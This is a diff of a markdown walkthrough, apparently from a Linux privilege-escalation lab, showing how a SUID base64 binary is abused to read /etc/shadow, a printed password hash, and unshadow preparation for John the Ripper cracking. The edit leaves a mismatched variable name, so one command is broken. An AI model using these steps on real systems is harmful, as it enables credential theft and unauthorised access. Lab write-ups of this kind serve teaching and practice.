@@ -313,7 +313,7 @@ LFILE=file_to_read
 * `find / -type f -perm -04000 -ls 2>/dev/null`.
   * `/usr/bin/base64` has SUID bit set.
 ```
-$ LFILE1=/etc/shadow
+$ LFILE=/etc/shadow
 $ /usr/bin/base64 "$LFILE1" | base64 --decode | grep user2
 ```
 * Prints contents of the `/etc/shadow` file.
@@ -321,25 +321,18 @@ $ /usr/bin/base64 "$LFILE1" | base64 --decode | grep user2
 user2:$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/:18796:0:99999:7:::
 ```
 ```
-$ LFILE2=/etc/passwd
-$ /usr/bin/base64 "$LFILE2" | base64 --decode | grep user2
-```
-* Prints contents of the `/etc/passwd` file.
-```
-user2:x:1002:1002::/home/user2:/bin/sh
-```
 * Create empty files in SUID folder.
 ```
 touch ./Desktop/SUID/passwd.txt
 ```
-  * Copy **user2** data from `/etc/passwd' into `passwd.txt` file.
+  * Copy user2 data from `/etc/passwd' into `passwd.txt` file.
 ```
 touch ./Desktop/SUID/passwords.txt
 ```
 ```
 touch ./Desktop/SUID/shadow.txt
 ```
-  * Copy **user2** data from `/etc/shadow' into `shadow.txt` file.
+  * Copy user2 data from `/etc/shadow' into `shadow.txt` file.
 * `unshadow` tool creates a file crackable by John the Ripper.
 ```
 unshadow ./Desktop/SUID/passwd.txt ./Desktop/SUID/shadow.txt > ./Desktop/SUID/passwords.txt
